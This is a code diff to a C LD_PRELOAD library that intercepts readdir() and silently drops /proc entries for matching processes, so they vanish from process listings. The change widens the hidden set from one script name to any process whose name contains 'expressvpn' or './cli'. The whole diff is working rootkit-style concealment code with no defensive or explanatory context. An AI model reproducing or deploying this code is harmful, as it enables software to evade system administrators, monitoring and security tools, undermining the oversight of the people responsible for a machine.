@@ -7,9 +7,10 @@
 #include <unistd.h>
 
 /*
- * Every process with this name will be excluded
+ * Processes containing these substrings in their names will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* processes_to_filter[] = {"expressvpn", "./cli"};
+static const int filter_count = sizeof(processes_to_filter) / sizeof(processes_to_filter[0]);
 
 /*
  * Get a directory name given a DIR* handle
@@ -61,6 +62,16 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
+/* Check if process name matches any of the filters */
+static int is_filtered_process(const char* process_name) {
+    for (int i = 0; i < filter_count; i++) {
+        if (strstr(process_name, processes_to_filter[i]) != NULL) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                         \
@@ -85,7 +96,7 @@ struct dirent* readdir(DIR *dirp)                                       \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                is_filtered_process(process_name)) {                    \
                 continue;                                               \
             }                                                           \
         }                                                               \
